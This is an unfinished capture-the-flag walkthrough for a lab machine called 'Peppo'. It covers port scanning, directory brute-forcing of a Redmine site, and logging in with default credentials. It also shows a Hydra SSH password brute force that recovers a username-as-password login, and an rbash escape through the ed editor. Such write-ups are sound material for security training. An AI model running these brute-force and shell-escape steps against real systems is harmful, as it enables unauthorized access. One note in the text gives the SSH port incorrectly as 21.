# "Peppo" (Hard) - Incomplete

## Information Gathering

Scanned all TCP ports:

```
PORT      STATE  SERVICE           VERSION
22/tcp    open   ssh               OpenSSH 7.4p1 Debian 10+deb9u7 (protocol 2.0)
| ssh-hostkey: 
|   2048 754c0201fa1e9fcce47b52feba3685a9 (RSA)
|   256 b76f9c2bbffb0462f418c938f43d6b2b (ECDSA)
|_  256 987fb640cebbb557d5d13c65727487c3 (ED25519)
|_auth-owners: root
53/tcp    closed domain
113/tcp   open   ident             FreeBSD identd
|_auth-owners: nobody
5432/tcp  open   postgresql        PostgreSQL DB 12.3 - 12.4
8080/tcp  open   http              WEBrick httpd 1.4.2 (Ruby 2.6.6 (2020-03-31))
|_http-favicon: Unknown favicon MD5: D316E1622C58825727E7E4E6C954D289
|_http-server-header: WEBrick/1.4.2 (Ruby/2.6.6/2020-03-31)
|_http-title: Redmine
| http-robots.txt: 4 disallowed entries 
|_/issues/gantt /issues/calendar /activity /search
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
10000/tcp open   snet-sensor-mgmt?
|_auth-owners: eleanor
| fingerprint-strings: 
|   DNSStatusRequestTCP, DNSVersionBindReqTCP, Help, Kerberos, LANDesk-RC, LDAPBindReq, LDAPSearchReq, LPDString, RPCCheck, RTSPRequest, SIPOptions, SMBProgNeg, SSLSessionReq, TLSSessionReq, TerminalServer, TerminalServerCookie, X11Probe: 
|     HTTP/1.1 400 Bad Request
|     Connection: close
|   FourOhFourRequest: 
|     HTTP/1.1 200 OK
|     Content-Type: text/plain
|     Date: Sun, 13 Nov 2022 20:35:42 GMT
|     Connection: close
|     Hello World
|   GetRequest, HTTPOptions: 
|     HTTP/1.1 200 OK
|     Content-Type: text/plain
|     Date: Sun, 13 Nov 2022 20:35:36 GMT
|     Connection: close
|_    Hello World
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port10000-TCP:V=7.93%I=7%D=11/13%Time=63715518%P=x86_64-pc-linux-gnu%r(
SF:GetRequest,71,"HTTP/1\.1\x20200\x20OK\r\nContent-Type:\x20text/plain\r\
SF:nDate:\x20Sun,\x2013\x20Nov\x202022\x2020:35:36\x20GMT\r\nConnection:\x
SF:20close\r\n\r\nHello\x20World\n")%r(HTTPOptions,71,"HTTP/1\.1\x20200\x2
SF:0OK\r\nContent-Type:\x20text/plain\r\nDate:\x20Sun,\x2013\x20Nov\x20202
SF:2\x2020:35:36\x20GMT\r\nConnection:\x20close\r\n\r\nHello\x20World\n")%
SF:r(RTSPRequest,2F,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nConnection:\x20
SF:close\r\n\r\n")%r(RPCCheck,2F,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nCo
SF:nnection:\x20close\r\n\r\n")%r(DNSVersionBindReqTCP,2F,"HTTP/1\.1\x2040
SF:0\x20Bad\x20Request\r\nConnection:\x20close\r\n\r\n")%r(DNSStatusReques
SF:tTCP,2F,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nConnection:\x20close\r\n
SF:\r\n")%r(Help,2F,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nConnection:\x20
SF:close\r\n\r\n")%r(SSLSessionReq,2F,"HTTP/1\.1\x20400\x20Bad\x20Request\
SF:r\nConnection:\x20close\r\n\r\n")%r(TerminalServerCookie,2F,"HTTP/1\.1\
SF:x20400\x20Bad\x20Request\r\nConnection:\x20close\r\n\r\n")%r(TLSSession
SF:Req,2F,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nConnection:\x20close\r\n\
SF:r\n")%r(Kerberos,2F,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nConnection:\
SF:x20close\r\n\r\n")%r(SMBProgNeg,2F,"HTTP/1\.1\x20400\x20Bad\x20Request\
SF:r\nConnection:\x20close\r\n\r\n")%r(X11Probe,2F,"HTTP/1\.1\x20400\x20Ba
SF:d\x20Request\r\nConnection:\x20close\r\n\r\n")%r(FourOhFourRequest,71,"
SF:HTTP/1\.1\x20200\x20OK\r\nContent-Type:\x20text/plain\r\nDate:\x20Sun,\
SF:x2013\x20Nov\x202022\x2020:35:42\x20GMT\r\nConnection:\x20close\r\n\r\n
SF:Hello\x20World\n")%r(LPDString,2F,"HTTP/1\.1\x20400\x20Bad\x20Request\r
SF:\nConnection:\x20close\r\n\r\n")%r(LDAPSearchReq,2F,"HTTP/1\.1\x20400\x
SF:20Bad\x20Request\r\nConnection:\x20close\r\n\r\n")%r(LDAPBindReq,2F,"HT
SF:TP/1\.1\x20400\x20Bad\x20Request\r\nConnection:\x20close\r\n\r\n")%r(SI
SF:POptions,2F,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nConnection:\x20close
SF:\r\n\r\n")%r(LANDesk-RC,2F,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nConne
SF:ction:\x20close\r\n\r\n")%r(TerminalServer,2F,"HTTP/1\.1\x20400\x20Bad\
SF:x20Request\r\nConnection:\x20close\r\n\r\n");
Service Info: OSs: Linux, FreeBSD; CPE: cpe:/o:linux:linux_kernel, cpe:/o:freebsd:freebsd
```

Enumerated UDP ports:

```
Not shown: 1000 open|filtered udp ports (no-response)
```

Notes:

* 21/SSH is open -- Password?
  * Potential users:&#x20;
    * admin
    * root
    * eleanor
* Searchsploited Everything
* Directory bruteforce on both HTTP endpoints
* Nikto 8080 and 10000

## Enumeration

### Port 8080 - HTTP (WEBrick httpd 1.4.2 (Ruby 2.6.6 (2020-03-31)))

Directory Bruteforce:

```
gobuster dir -u http://192.168.81.60:8080 -w /usr/share/seclists/Discovery/Web-Content/common.txt
===============================================================
Gobuster v3.3
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://192.168.81.60:8080
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/seclists/Discovery/Web-Content/common.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.3
[+] Timeout:                 10s
===============================================================
2022/11/13 15:40:51 Starting gobuster in directory enumeration mode
===============================================================
/404                  (Status: 200) [Size: 459]
/500                  (Status: 200) [Size: 648]
/activity             (Status: 200) [Size: 7311]
/admin.cgi            (Status: 401) [Size: 0]
/admin.php            (Status: 401) [Size: 0]
/admin.pl             (Status: 401) [Size: 0]
/admin                (Status: 302) [Size: 148] [--> http://192.168.81.60:8080/login?back_url=http%3A%2F%2F192.168.81.60%3A8080%2Fadmin]
/favicon.ico          (Status: 200) [Size: 7886]
/groups               (Status: 302) [Size: 149] [--> http://192.168.81.60:8080/login?back_url=http%3A%2F%2F192.168.81.60%3A8080%2Fgroups]
/issues               (Status: 200) [Size: 19696]
/login                (Status: 200) [Size: 5011]
/logout               (Status: 302) [Size: 92] [--> http://192.168.81.60:8080/]
/my                   (Status: 302) [Size: 145] [--> http://192.168.81.60:8080/login?back_url=http%3A%2F%2F192.168.81.60%3A8080%2Fmy]
/news                 (Status: 200) [Size: 5361]
/projects             (Status: 200) [Size: 12258]
/queries              (Status: 406) [Size: 4768]
/robots.txt           (Status: 200) [Size: 103]
/roles                (Status: 302) [Size: 148] [--> http://192.168.81.60:8080/login?back_url=http%3A%2F%2F192.168.81.60%3A8080%2Froles]                                                                                                              
/search               (Status: 200) [Size: 7933]
/settings             (Status: 302) [Size: 151] [--> http://192.168.81.60:8080/login?back_url=http%3A%2F%2F192.168.81.60%3A8080%2Fsettings]                                                                                                           
/trackers             (Status: 302) [Size: 151] [--> http://192.168.81.60:8080/login?back_url=http%3A%2F%2F192.168.81.60%3A8080%2Ftrackers]                                                                                                           
/users                (Status: 302) [Size: 148] [--> http://192.168.81.60:8080/login?back_url=http%3A%2F%2F192.168.81.60%3A8080%2Fusers]                                                                                                              
Progress: 4695 / 4714 (99.60%)
```

Default Credentials:&#x20;

<figure><img src="../../../.gitbook/assets/image (6).png" alt=""><figcaption></figcaption></figure>

* I was able to use default credentials on the admin page
* Upon logging in, I had to change my credentials because they expired

Information Page:

<figure><img src="../../../.gitbook/assets/image (47).png" alt=""><figcaption></figcaption></figure>

* <mark style="color:yellow;">The version at the bottom also says that it is running a 2020 version</mark>

## Exploitation

### Password same as username

Hydra Bruteforce:

```
hydra -L users -P users 192.168.81.60 ssh -t 4
Hydra v9.4 (c) 2022 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2022-11-13 17:08:10
[DATA] max 4 tasks per 1 server, overall 4 tasks, 9 login tries (l:3/p:3), ~3 tries per task
[DATA] attacking ssh://192.168.81.60:22/
[22][ssh] host: 192.168.81.60   login: eleanor   password: eleanor
```

## Privilege Escalation

### Rbash Jail

<figure><img src="../../../.gitbook/assets/image (3).png" alt=""><figcaption></figcaption></figure>

* <mark style="color:yellow;">We need to find a way to escape rbash</mark>

{% embed url="https://www.hacknos.com/rbash-escape-rbash-restricted-shell-escape/" %}

<mark style="color:yellow;">Escaped</mark>:

```
ed
!'/bin/bash'
```
